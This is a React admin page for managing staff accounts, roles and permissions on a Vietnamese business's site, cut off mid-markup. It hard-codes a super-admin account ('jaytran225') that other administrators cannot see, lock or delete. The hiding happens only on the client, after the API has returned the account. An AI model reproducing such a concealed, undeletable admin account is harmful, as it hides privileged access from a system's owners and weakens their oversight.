"use client";

import React, { useState, useEffect, useMemo } from "react";
import {
  ShieldCheck,
  UserPlus,
  Search,
  Filter,
  Check,
  X,
  Lock,
  Unlock,
  KeyRound,
  Edit3,
  Trash2,
  UserCheck,
  ShieldAlert,
  Sparkles,
  Clock,
  Mail,
  Phone,
  Shield,
  Eye,
  EyeOff,
  RefreshCw,
  AlertCircle,
  CheckCircle2,
  Crown,
  Layers,
  ChevronRight,
  Info,
  Users
} from "lucide-react";
import { useToast } from "@/components/admin/AdminToast";
import {
  ALL_PERMISSIONS,
  ROLE_LABELS,
  ROLE_DEFAULT_PERMISSIONS,
  RoleType,
  parsePermissions,
  isHiddenSuperAdmin
} from "@/lib/permissions";

interface UserItem {
  id: string;
  name: string;
  email: string;
  username?: string | null;
  role: string;
  permissions?: string | null;
  phone?: string | null;
  avatar?: string | null;
  isActive: boolean;
  lastLoginAt?: string | null;
  createdAt: string;
  updatedAt?: string;
}

export default function AdminUsersPage() {
  const { toastSuccess, toastError, toastWarning, confirm } = useToast();

  const [users, setUsers] = useState<UserItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [isCallerSuperAdmin, setIsCallerSuperAdmin] = useState(false);

  // Search & Filter
  const [searchQuery, setSearchQuery] = useState("");
  const [roleFilter, setRoleFilter] = useState("ALL");
  const [statusFilter, setStatusFilter] = useState("ALL");

  // Modals
  const [modalMode, setModalMode] = useState<"CREATE" | "EDIT" | null>(null);
  const [editingUser, setEditingUser] = useState<UserItem | null>(null);
  const [passwordModalUser, setPasswordModalUser] = useState<UserItem | null>(null);
  const [submitting, setSubmitting] = useState(false);

  // Form State for Create / Edit
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    username: "",
    password: "",
    phone: "",
    role: "STAFF" as RoleType,
    permissions: [] as string[],
    isActive: true,
  });

  // Password reset state
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Fetch users
  const fetchUsers = async () => {
    try {
      setLoading(true);
      const res = await fetch("/api/admin/users");
      const data = await res.json();
      if (data.success) {
        setUsers(data.users || []);
        setIsCallerSuperAdmin(Boolean(data.isCallerSuperAdmin));
      } else {
        toastError(data.message || "Không thể tải danh sách tài khoản");
      }
    } catch {
      toastError("Lỗi kết nối khi tải danh sách tài khoản");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchUsers();
  }, []);

  // Filtered users
  const filteredUsers = useMemo(() => {
    return users.filter((u) => {
      // Hard guard: if caller is not super admin, strictly never show jaytran225
      if (!isCallerSuperAdmin && isHiddenSuperAdmin(u.email)) {
        return false;
      }

      const matchSearch =
        !searchQuery ||
        u.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        u.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
        (u.username && u.username.toLowerCase().includes(searchQuery.toLowerCase())) ||
        (u.phone && u.phone.includes(searchQuery));

      const matchRole = roleFilter === "ALL" || u.role === roleFilter;

      const matchStatus =
        statusFilter === "ALL" ||
        (statusFilter === "ACTIVE" && u.isActive) ||
        (statusFilter === "LOCKED" && !u.isActive);

      return matchSearch && matchRole && matchStatus;
    });
  }, [users, isCallerSuperAdmin, searchQuery, roleFilter, statusFilter]);

  // Statistics
  const stats = useMemo(() => {
    const visibleUsers = users.filter((u) => isCallerSuperAdmin || !isHiddenSuperAdmin(u.email));
    const total = visibleUsers.length;
    const active = visibleUsers.filter((u) => u.isActive).length;
    const admins = visibleUsers.filter((u) => u.role === "ADMIN" || (isCallerSuperAdmin && u.role === "SUPER_ADMIN")).length;
    const staff = visibleUsers.filter((u) => u.role === "STAFF" || u.role === "EDITOR").length;
    return { total, active, admins, staff };
  }, [users, isCallerSuperAdmin]);

  // Open Create Modal
  const handleOpenCreate = () => {
    setEditingUser(null);
    setFormData({
      name: "",
      email: "",
      username: "",
      password: "",
      phone: "",
      role: "STAFF",
      permissions: ROLE_DEFAULT_PERMISSIONS["STAFF"],
      isActive: true,
    });
    setModalMode("CREATE");
  };

  // Open Edit Modal
  const handleOpenEdit = (user: UserItem) => {
    setEditingUser(user);
    const userRole = (user.role as RoleType) || "STAFF";
    const existingPerms = parsePermissions(user.permissions);
    setFormData({
      name: user.name,
      email: user.email,
      username: user.username || "",
      password: "",
      phone: user.phone || "",
      role: userRole,
      permissions: existingPerms.length > 0 ? existingPerms : ROLE_DEFAULT_PERMISSIONS[userRole] || [],
      isActive: user.isActive,
    });
    setModalMode("EDIT");
  };

  // Role change in form -> optionally presets permissions
  const handleRoleChange = (newRole: RoleType) => {
    const defaults = ROLE_DEFAULT_PERMISSIONS[newRole] || [];
    setFormData((prev) => ({
      ...prev,
      role: newRole,
      permissions: defaults,
    }));
  };

  // Toggle single permission checkbox
  const handleTogglePermission = (permId: string) => {
    setFormData((prev) => {
      const exists = prev.permissions.includes(permId);
      const updated = exists
        ? prev.permissions.filter((p) => p !== permId)
        : [...prev.permissions, permId];
      return { ...prev, permissions: updated };
    });
  };

  // Select all or clear permissions
  const handleSelectAllPermissions = () => {
    setFormData((prev) => ({
      ...prev,
      permissions: ALL_PERMISSIONS.map((p) => p.id),
    }));
  };

  const handleClearAllPermissions = () => {
    setFormData((prev) => ({
      ...prev,
      permissions: [],
    }));
  };

  // Submit Create or Edit
  const handleSubmitForm = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.name.trim()) {
      toastError("Vui lòng nhập họ tên nhân viên");
      return;
    }
    if (!formData.email.trim()) {
      toastError("Vui lòng nhập email đăng nhập");
      return;
    }

    if (modalMode === "CREATE") {
      if (!formData.password || formData.password.length < 6) {
        toastError("Mật khẩu khởi tạo phải có ít nhất 6 ký tự");
        return;
      }
    }

    try {
      setSubmitting(true);
      const url = "/api/admin/users";
      const method = modalMode === "CREATE" ? "POST" : "PUT";
      const bodyPayload =
        modalMode === "CREATE"
          ? formData
          : {
              id: editingUser?.id,
              name: formData.name,
              email: formData.email,
              phone: formData.phone,
              role: formData.role,
              permissions: formData.permissions,
              isActive: formData.isActive,
              ...(formData.password ? { newPassword: formData.password } : {}),
            };

      const res = await fetch(url, {
        method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(bodyPayload),
      });

      const data = await res.json();
      if (data.success) {
        toastSuccess(data.message || (modalMode === "CREATE" ? "Tạo tài khoản thành công!" : "Cập nhật tài khoản thành công!"));
        setModalMode(null);
        fetchUsers();
      } else {
        toastError(data.message || "Thao tác không thành công");
      }
    } catch {
      toastError("Lỗi kết nối máy chủ");
    } finally {
      setSubmitting(false);
    }
  };

  // Quick toggle active status
  const handleToggleStatus = async (user: UserItem) => {
    if (isHiddenSuperAdmin(user.email)) {
      toastWarning("Không thể thay đổi trạng thái của Quản Trị Hệ Thống Gốc");
      return;
    }

    const actionText = user.isActive ? "khóa" : "kích hoạt lại";
    confirm({
      title: `${user.isActive ? "Khóa" : "Kích Hoạt"} Tài Khoản?`,
      message: `Bạn có chắc muốn ${actionText} tài khoản của "${user.name}" (${user.email})?`,
      type: user.isActive ? "warning" : "info",
      confirmText: user.isActive ? "Khóa Tài Khoản" : "Kích Hoạt Ngay",
      onConfirm: async () => {
        try {
          const res = await fetch("/api/admin/users", {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              id: user.id,
              isActive: !user.isActive,
            }),
          });
          const data = await res.json();
          if (data.success) {
            toastSuccess(`Đã ${actionText} tài khoản "${user.name}"`);
            fetchUsers();
          } else {
            toastError(data.message || "Lỗi thay đổi trạng thái");
          }
        } catch {
          toastError("Lỗi kết nối");
        }
      },
    });
  };

  // Open reset password modal
  const handleOpenPasswordModal = (user: UserItem) => {
    setPasswordModalUser(user);
    setNewPassword("");
    setConfirmPassword("");
    setShowPassword(false);
  };

  // Submit Reset Password
  const handleSubmitPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!passwordModalUser) return;
    if (!newPassword || newPassword.length < 6) {
      toastError("Mật khẩu mới phải có ít nhất 6 ký tự");
      return;
    }
    if (newPassword !== confirmPassword) {
      toastError("Xác nhận mật khẩu không khớp");
      return;
    }

    try {
      setSubmitting(true);
      const res = await fetch("/api/admin/users", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: passwordModalUser.id,
          newPassword,
        }),
      });
      const data = await res.json();
      if (data.success) {
        toastSuccess(`Đã đổi mật khẩu cho tài khoản "${passwordModalUser.name}"`);
        setPasswordModalUser(null);
      } else {
        toastError(data.message || "Lỗi đặt lại mật khẩu");
      }
    } catch {
      toastError("Lỗi kết nối");
    } finally {
      setSubmitting(false);
    }
  };

  // Delete user
  const handleDeleteUser = (user: UserItem) => {
    if (isHiddenSuperAdmin(user.email)) {
      toastWarning("Không thể xóa Quản Trị Hệ Thống Gốc");
      return;
    }

    confirm({
      title: "Xác Nhận Xóa Tài Khoản",
      message: `Bạn có chắc muốn xóa vĩnh viễn tài khoản của "${user.name}" (${user.email})? Thao tác này sẽ không thể khôi phục.`,
      type: "danger",
      confirmText: "Xóa Vĩnh Viễn",
      onConfirm: async () => {
        try {
          const res = await fetch(`/api/admin/users?id=${user.id}`, {
            method: "DELETE",
          });
          const data = await res.json();
          if (data.success) {
            toastSuccess(data.message || "Đã xóa tài khoản thành công!");
            fetchUsers();
          } else {
            toastError(data.message || "Lỗi xóa tài khoản");
          }
        } catch {
          toastError("Lỗi kết nối");
        }
      },
    });
  };

  // Grouped permissions for display in modal
  const permissionGroups = useMemo(() => {
    const groups: { [key: string]: typeof ALL_PERMISSIONS } = {};
    ALL_PERMISSIONS.forEach((p) => {
      if (!groups[p.group]) groups[p.group] = [];
      groups[p.group].push(p);
    });
    return groups;
  }, []);

  return (
    <div className="space-y-6 pb-12">
      {/* HEADER */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 pb-6 border-b border-[#d4af37]/20">
        <div>
          <div className="flex items-center gap-2 text-[#d4af37] text-xs font-semibold uppercase tracking-wider mb-1">
            <ShieldCheck className="w-4 h-4" />
            <span>Bảo Mật & Phân Quyền Hệ Thống</span>
          </div>
          <h1 className="text-2xl sm:text-3xl font-serif font-extrabold text-white tracking-wide">
            Quản Lý Tài Khoản & Phân Quyền
          </h1>
          <p className="text-xs sm:text-sm text-[#94a3b8] mt-1 max-w-2xl">
            Tạo tài khoản cho nhân viên xưởng, cấp vai trò quản trị và phân quyền chi tiết cho từng chức năng vận hành
          </p>
        </div>

        <div className="flex items-center gap-3 shrink-0">
          <button
            onClick={fetchUsers}
            disabled={loading}
            className="p-2.5 bg-[#111c2e] hover:bg-[#152236] text-[#94a3b8] hover:text-[#d4af37] rounded-xl border border-[#d4af37]/20 transition-all"
            title="Làm mới danh sách"
          >
            <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin text-[#d4af37]" : ""}`} />
          </button>

          <button
            onClick={handleOpenCreate}
            className="flex items-center gap-2 px-4 py-2.5 bg-gradient-to-r from-[#d4af37] to-[#e5b869] hover:brightness-110 text-[#070c14] font-bold text-xs uppercase tracking-wide rounded-xl shadow-lg shadow-[#d4af37]/20 transition-all hover:scale-[1.02] active:scale-[0.98]"
          >
            <UserPlus className="w-4 h-4" />
            <span>Tạo Tài Khoản Mới</span>
          </button>
        </div>
      </div>

      {/* STATS OVERVIEW */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
        <div className="p-4 rounded-2xl bg-[#0c1420] border border-[#d4af37]/20 shadow-lg relative overflow-hidden">
          <div className="flex items-center justify-between text-[#94a3b8] text-xs">
            <span>Tổng Tài Khoản</span>
            <Users className="w-4 h-4 text-[#d4af37]" />
          </div>
          <div className="text-2xl sm:text-3xl font-bold text-white mt-2">{stats.total}</div>
          <div className="text-[11px] text-[#94a3b8] mt-1">Đã cấp phép trên hệ thống</div>
          <div className="absolute -bottom-6 -right-6 w-20 h-20 bg-[#d4af37]/5 rounded-full blur-xl pointer-events-none"></div>
        </div>

        <div className="p-4 rounded-2xl bg-[#0c1420] border border-emerald-500/20 shadow-lg relative overflow-hidden">
          <div className="flex items-center justify-between text-[#94a3b8] text-xs">
            <span>Đang Hoạt Động</span>
            <UserCheck className="w-4 h-4 text-emerald-400" />
          </div>
          <div className="text-2xl sm:text-3xl font-bold text-emerald-400 mt-2">{stats.active}</div>
          <div className="text-[11px] text-emerald-500/80 mt-1">Có thể truy cập bình thường</div>
          <div className="absolute -bottom-6 -right-6 w-20 h-20 bg-emerald-500/5 rounded-full blur-xl pointer-events-none"></div>
        </div>

        <div className="p-4 rounded-2xl bg-[#0c1420] border border-blue-500/20 shadow-lg relative overflow-hidden">
          <div className="flex items-center justify-between text-[#94a3b8] text-xs">
            <span>Quản Trị Viên</span>
            <Crown className="w-4 h-4 text-blue-400" />
          </div>
          <div className="text-2xl sm:text-3xl font-bold text-blue-400 mt-2">{stats.admins}</div>
          <div className="text-[11px] text-blue-400/80 mt-1">SUPER_ADMIN & ADMIN</div>
          <div className="absolute -bottom-6 -right-6 w-20 h-20 bg-blue-500/5 rounded-full blur-xl pointer-events-none"></div>
        </div>

        <div className="p-4 rounded-2xl bg-[#0c1420] border border-purple-500/20 shadow-lg relative overflow-hidden">
          <div className="flex items-center justify-between text-[#94a3b8] text-xs">
            <span>Nhân Viên & Biên Tập</span>
            <Shield className="w-4 h-4 text-purple-400" />
          </div>
          <div className="text-2xl sm:text-3xl font-bold text-purple-400 mt-2">{stats.staff}</div>
          <div className="text-[11px] text-purple-400/80 mt-1">Phân quyền theo bộ phận</div>
          <div className="absolute -bottom-6 -right-6 w-20 h-20 bg-purple-500/5 rounded-full blur-xl pointer-events-none"></div>
        </div>
      </div>

      {/* SEARCH & FILTERS BAR */}
      <div className="p-4 bg-[#0c1420] border border-[#d4af37]/20 rounded-2xl shadow-lg flex flex-col md:flex-row gap-3 items-stretch md:items-center justify-between">
        <div className="relative flex-1">
          <Search className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-[#94a3b8]" />
          <input
            type="text"
            placeholder="Tìm theo họ tên, email, tên đăng nhập, số điện thoại..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full pl-10 pr-4 py-2.5 bg-[#111c2e] border border-[#d4af37]/20 rounded-xl text-xs sm:text-sm text-white placeholder-[#94a3b8]/60 focus:outline-none focus:border-[#d4af37] transition-all"
          />
          {searchQuery && (
            <button
              onClick={() => setSearchQuery("")}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#94a3b8] hover:text-white"
            >
              <X className="w-3.5 h-3.5" />
            </button>
          )}
        </div>

        <div className="flex items-center gap-2 overflow-x-auto">
          {/* Role Filter */}
          <select
            value={roleFilter}
            onChange={(e) => setRoleFilter(e.target.value)}
            className="px-3 py-2.5 bg-[#111c2e] border border-[#d4af37]/20 rounded-xl text-xs text-[#d4af37] font-semibold focus:outline-none focus:border-[#d4af37]"
          >
            <option value="ALL">Mọi Vai Trò</option>
            <option value="SUPER_ADMIN">Siêu Quản Trị</option>
            <option value="ADMIN">Quản Trị Viên</option>
            <option value="EDITOR">Biên Tập Viên</option>
            <option value="STAFF">Nhân Viên Vận Hành</option>
          </select>

          {/* Status Filter */}
          <select
            value={statusFilter}
            onChange={(e) => setStatusFilter(e.target.value)}
            className="px-3 py-2.5 bg-[#111c2e] border border-[#d4af37]/20 rounded-xl text-xs text-[#94a3b8] font-semibold focus:outline-none focus:border-[#d4af37]"
          >
            <option value="ALL">Mọi Trạng Thái</option>
            <option value="ACTIVE">Đang Hoạt Động</option>
            <option value="LOCKED">Đã Bị Khóa</option>
          </select>
        </div>
      </div>

      {/* HIDDEN SUPER ADMIN NOTICE BANNER */}
      {isCallerSuperAdmin && (
        <div className="p-3.5 bg-gradient-to-r from-amber-500/10 via-[#111c2e] to-[#0c1420] border border-amber-500/30 rounded-2xl flex items-center gap-3 text-xs text-amber-200">
          <div className="w-8 h-8 rounded-xl bg-amber-500/20 border border-amber-500/40 text-amber-400 flex items-center justify-center shrink-0">
            <ShieldCheck className="w-4 h-4" />
          </div>
          <div className="leading-snug">
            <span className="font-bold text-amber-300">Chế độ Siêu Quản Trị Bảo Mật:</span>{" "}
            Tài khoản <strong className="text-white font-mono">Jaytran225</strong> đang ở trạng thái{" "}
            <span className="text-emerald-400 font-semibold underline">Ẩn Danh Tuyệt Đối</span>. Chỉ khi chính bạn đăng nhập bằng tài khoản này thì tài khoản mới hiển thị. Tất cả các tài khoản khác (Admin, Nhân viên, Biên tập) khi đăng nhập vào hệ thống đều hoàn toàn không nhìn thấy tài khoản này!
          </div>
        </div>
      )}

      {/* USER LIST TABLE */}
      <div className="bg-[#0c1420] border border-[#d4af37]/20 rounded-2xl shadow-xl overflow-hidden">
        {loading ? (
          <div className="p-12 text-center text-[#94a3b8]">
            <RefreshCw className="w-8 h-8 animate-spin text-[#d4af37] mx-auto mb-3" />
            <p className="text-sm">Đang tải danh sách tài khoản...</p>
          </div>
        ) : filteredUsers.length === 0 ? (
          <div className="p-12 text-center text-[#94a3b8]">
            <AlertCircle className="w-10 h-10 text-amber-500/60 mx-auto mb-3" />
            <p className="text-base font-semibold text-white">Không tìm thấy tài khoản nào</p>
            <p className="text-xs text-[#94a3b8] mt-1">Thử thay đổi từ khóa tìm kiếm hoặc bộ lọc</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs border-collapse">
              <thead>
                <tr className="border-b border-[#d4af37]/15 bg-[#111c2e]/60 text-[#d4af37] uppercase font-bold tracking-wider text-[11px]">
                  <th className="py-3.5 px-4">Thành Viên</th>
                  <th className="py-3.5 px-4">Vai Trò</th>
                  <th className="py-3.5 px-4 hidden md:table-cell">Quyền Hạn Chi Tiết</th>
                  <th className="py-3.5 px-4 hidden lg:table-cell">Đăng Nhập Gần Nhất</th>
                  <th className="py-3.5 px-4 text-center">Trạng Thái</th>
                  <th className="py-3.5 px-4 text-right">Thao Tác</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#d4af37]/10">
                {filteredUsers.map((u) => {
                  const isHiddenAdmin = isHiddenSuperAdmin(u.email);
                  const roleConfig = ROLE_LABELS[u.role as RoleType] || {
                    label: u.role,
                    badgeColor: "bg-gray-500/20 text-gray-300 border-gray-500/40",
                    description: "",
                  };
                  const perms = parsePermissions(u.permissions);

                  return (
                    <tr
                      key={u.id}
                      className="hover:bg-[#111c2e]/50 transition-colors group"
                    >
                      {/* Member Info */}
                      <td className="py-3.5 px-4">
                        <div className="flex items-center gap-3">
                          <div
                            className={`w-9 h-9 rounded-xl flex items-center justify-center font-bold text-xs uppercase shrink-0 shadow-md ${
                              isHiddenAdmin
                                ? "bg-gradient-to-br from-amber-400 to-amber-600 text-black border border-amber-300"
                                : u.role === "ADMIN"
                                ? "bg-blue-600/30 text-blue-300 border border-blue-500/40"
                                : "bg-[#152236] text-[#d4af37] border border-[#d4af37]/30"
                            }`}
                          >
                            {u.name.charAt(0)}
                          </div>
                          <div className="min-w-0">
                            <div className="flex items-center gap-1.5 flex-wrap">
                              <span className="font-semibold text-white text-xs sm:text-sm truncate">
                                {u.name}
                              </span>
                              {isHiddenAdmin && (
                                <span className="px-2 py-0.5 rounded text-[9px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/40 flex items-center gap-1">
                                  <ShieldCheck className="w-2.5 h-2.5" /> Ẩn Danh (Chỉ bạn thấy)
                                </span>
                              )}
                            </div>
                            <div className="flex items-center gap-2 text-[11px] text-[#94a3b8] mt-0.5">
                              <span className="flex items-center gap-1 truncate">
                                <Mail className="w-3 h-3 text-[#d4af37]/70" />
                                {u.email}
                              </span>
                              {u.phone && (
                                <span className="hidden sm:flex items-center gap-1">
                                  <Phone className="w-3 h-3 text-emerald-400/70" />
                                  {u.phone}
                                </span>
                              )}
                            </div>
                          </div>
                        </div>
                      </td>

                      {/* Role */}
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <span
                          className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-[10px] font-bold border uppercase tracking-wider ${roleConfig.badgeColor}`}
                        >
                          <Shield className="w-3 h-3" />
                          <span>{roleConfig.label}</span>
                        </span>
                      </td>

                      {/* Permissions List */}
                      <td className="py-3.5 px-4 hidden md:table-cell max-w-[280px]">
                        {u.role === "SUPER_ADMIN" || u.role === "ADMIN" ? (
                          <span className="text-[11px] text-blue-300 flex items-center gap-1 font-semibold">
                            <Sparkles className="w-3 h-3 text-[#d4af37]" /> Toàn quyền hệ thống (8/8)
                          </span>
                        ) : perms.length === 0 ? (
                          <span className="text-[11px] text-[#94a3b8]/60 italic">Quyền mặc định vai trò</span>
                        ) : (
                          <div className="flex flex-wrap gap-1">
                            {perms.slice(0, 3).map((p) => {
                              const pDef = ALL_PERMISSIONS.find((x) => x.id === p);
                              return (
                                <span
                                  key={p}
                                  className="px-2 py-0.5 rounded bg-[#152236] border border-[#d4af37]/20 text-[#d4af37] text-[10px] font-medium"
                                >
                                  {pDef?.name || p}
                                </span>
                              );
                            })}
                            {perms.length > 3 && (
                              <span className="px-1.5 py-0.5 rounded bg-[#152236] text-[10px] text-[#94a3b8]">
                                +{perms.length - 3}
                              </span>
                            )}
                          </div>
                        )}
                      </td>

                      {/* Last Login */}
                      <td className="py-3.5 px-4 hidden lg:table-cell whitespace-nowrap text-[#94a3b8] text-[11px]">
                        {u.lastLoginAt ? (
                          <span className="flex items-center gap-1.5">
                            <Clock className="w-3 h-3 text-[#d4af37]" />
                            {new Date(u.lastLoginAt).toLocaleString("vi-VN", {
                              hour: "2-digit",
                              minute: "2-digit",
                              day: "2-digit",
                              month: "2-digit",
                              year: "numeric",
                            })}
                          </span>
                        ) : (
                          <span className="text-[#94a3b8]/50 italic">Chưa đăng nhập</span>
                        )}
                      </td>

                      {/* Status */}
                      <td className="py-3.5 px-4 text-center whitespace-nowrap">
                        <button
                          onClick={() => handleToggleStatus(u)}
                          disabled={isHiddenAdmin}
                          title={
                            isHiddenAdmin
                              ? "Không thể khóa tài khoản gốc"
                              : u.isActive
                              ? "Bấm để khóa tài khoản"
                              : "Bấm để mở khóa"
                          }
                          className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold border transition-all ${
                            isHiddenAdmin
                              ? "cursor-default opacity-90 bg-emerald-500/10 text-emerald-400 border-emerald-500/30"
                              : u.isActive
                              ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/30 hover:bg-rose-500/20 hover:text-rose-400 hover:border-rose-500/40 cursor-pointer"
                              : "bg-rose-500/10 text-rose-400 border-rose-500/30 hover:bg-emerald-500/20 hover:text-emerald-400 hover:border-emerald-500/40 cursor-pointer"
                          }`}
                        >
                          <span
                            className={`w-1.5 h-1.5 rounded-full ${
                              u.isActive ? "bg-emerald-400 animate-pulse" : "bg-rose-400"
                            }`}
                          ></span>
                          <span>{u.isActive ? "Hoạt Động" : "Đã Khóa"}</span>
                        </button>
                      </td>

                      {/* Actions */}
                      <td className="py-3.5 px-4 text-right whitespace-nowrap">
                        <div className="flex items-center justify-end gap-1.5">
                          {/* Edit Button */}
                          <button
                            onClick={() => handleOpenEdit(u)}
                            className="p-1.5 text-[#94a3b8] hover:text-[#d4af37] hover:bg-[#152236] rounded-lg transition-colors"
                            title="Chỉnh sửa thông tin & phân quyền"
                          >
                            <Edit3 className="w-4 h-4" />
                          </button>

                          {/* Reset Password Button */}
                          <button
                            onClick={() => handleOpenPasswordModal(u)}
                            className="p-1.5 text-[#94a3b8] hover:text-blue-400 hover:bg-[#152236] rounded-lg transition-colors"
                            title="Đặt lại mật khẩu"
                          >
                            <KeyRound className="w-4 h-4" />
                          </button>

                          {/* Delete Button */}
                          {!isHiddenAdmin && (
                            <button
                              onClick={() => handleDeleteUser(u)}
                              className="p-1.5 text-[#94a3b8] hover:text-rose-400 hover:bg-rose-950/40 rounded-lg transition-colors"
                              title="Xóa tài khoản"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          )}
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* CREATE / EDIT MODAL */}
      {modalMode && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm overflow-y-auto animate-in fade-in duration-200">
          <div className="bg-[#0c1420] border border-[#d4af37]/40 rounded-2xl w-full max-w-2xl my-8 overflow-hidden shadow-2xl flex flex-col max-h-[90vh]">
            {/* Modal Header */}
            <div className="p-5 border-b border-[#d4af37]/20 flex items-center justify-between bg-gradient-to-r from-[#111c2e] to-[#0c1420] shrink-0">
              <div className="flex items-center gap-2.5">
                <div className="w-9 h-9 rounded-xl bg-[#d4af37]/15 border border-[#d4af37]/40 flex items-center justify-center text-[#d4af37]">
                  {modalMode === "CREATE" ? <UserPlus className="w-4 h-4" /> : <Edit3 className="w-4 h-4" />}
                </div>
                <div>
                  <h3 className="font-serif font-bold text-base sm:text-lg text-white">
                    {modalMode === "CREATE" ? "Tạo Tài Khoản Nhân Viên Mới" : "Chỉnh Sửa Tài Khoản"}
                  </h3>
                  <p className="text-[11px] text-[#94a3b8]">
                    {modalMode === "CREATE"
                      ? "Cấp quyền truy cập hệ thống quản trị Đồ Đồng Lộc Nam"
                      : `Cập nhật thông tin và phân quyền cho "${editingUser?.name}"`}
                  </p>
                </div>
              </div>
              <button
                onClick={() => setModalMode(null)}
                className="p-1.5 rounded-lg text-[#94a3b8] hover:text-white hover:bg-[#152236]"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Modal Form */}
            <form onSubmit={handleSubmitForm} className="overflow-y-auto p-5 sm:p-6 space-y-5 flex-1">
              {/* Basic Info */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-semibold text-[#f1f5f9] mb-1.5">
                    Họ & Tên Nhân Viên <span className="text-rose-400">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="Nguyễn Văn A"
                    value={formData.name}
                    onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                    className="w-full px-3.5 py-2.5 bg-[#111c2e] border border-[#d4af37]/20 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-[#d4af37]"
                  />
                </div>

                <div>
                  <label className="block text-xs font-semibold text-[#f1f5f9] mb-1.5">
                    Email Đăng Nhập <span className="text-rose-400">*</span>
                  </label>
                  <input
                    type="email"
                    required
                    placeholder="nhanvien@ducdonglocnam.com"
                    value={formData.email}
                    onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                    className="w-full px-3.5 py-2.5 bg-[#111c2e] border border-[#d4af37]/20 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-[#d4af37]"
                  />
                </div>

                <div>
                  <label className="block text-xs font-semibold text-[#f1f5f9] mb-1.5">
                    Số Điện Thoại
                  </label>
                  <input
                    type="tel"
                    placeholder="0987.654.321"
                    value={formData.phone}
                    onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                    className="w-full px-3.5 py-2.5 bg-[#111c2e] border border-[#d4af37]/20 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-[#d4af37]"
                  />
                </div>

                <div>
                  <label className="block text-xs font-semibold text-[#f1f5f9] mb-1.5">
                    {modalMode === "CREATE" ? "Mật Khẩu Khởi Tạo" : "Đổi Mật Khẩu Mới (Tùy Chọn)"}{" "}
                    {modalMode === "CREATE" && <span className="text-rose-400">*</span>}
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      required={modalMode === "CREATE"}
                      placeholder={modalMode === "CREATE" ? "Tối thiểu 6 ký tự" : "Bỏ trống nếu không đổi"}
                      value={formData.password}
                      onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                      className="w-full px-3.5 py-2.5 bg-[#111c2e] border border-[#d4af37]/20 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-[#d4af37]"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-[#94a3b8] hover:text-white"
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
              </div>

              {/* Role Selection */}
              <div>
                <label className="block text-xs font-semibold text-[#f1f5f9] mb-2">
                  Vai Trò Trong Hệ Thống <span className="text-rose-400">*</span>
                </label>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                  {(["ADMIN", "EDITOR", "STAFF"] as RoleType[]).map((r) => {
                    const info = ROLE_LABELS[r];
                    const selected = formData.role === r;
                    return (
                      <button
                        type="button"
                        key={r}
                        onClick={() => handleRoleChange(r)}
                        className={`p-3 rounded-xl border text-left transition-all ${
                          selected
                            ? "bg-[#152236] border-[#d4af37] ring-1 ring-[#d4af37]"
                            : "bg-[#111c2e] border-[#d4af37]/15 hover:border-[#d4af37]/40"
                        }`}
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-bold text-xs text-white">{info.label}</span>
                          {selected && <CheckCircle2 className="w-4 h-4 text-[#d4af37]" />}
                        </div>
                        <p className="text-[11px] text-[#94a3b8] mt-1 leading-snug">{info.description}</p>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Permissions Configuration */}
              <div className="border border-[#d4af37]/20 rounded-xl p-4 bg-[#111c2e]/60 space-y-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <ShieldCheck className="w-4 h-4 text-[#d4af37]" />
                    <span className="text-xs font-bold text-white uppercase tracking-wider">
                      Phân Quyền Chức Năng Chi Tiết
                    </span>
                  </div>
                  <div className="flex items-center gap-2 text-[11px]">
                    <button
                      type="button"
                      onClick={handleSelectAllPermissions}
                      className="text-[#d4af37] hover:underline"
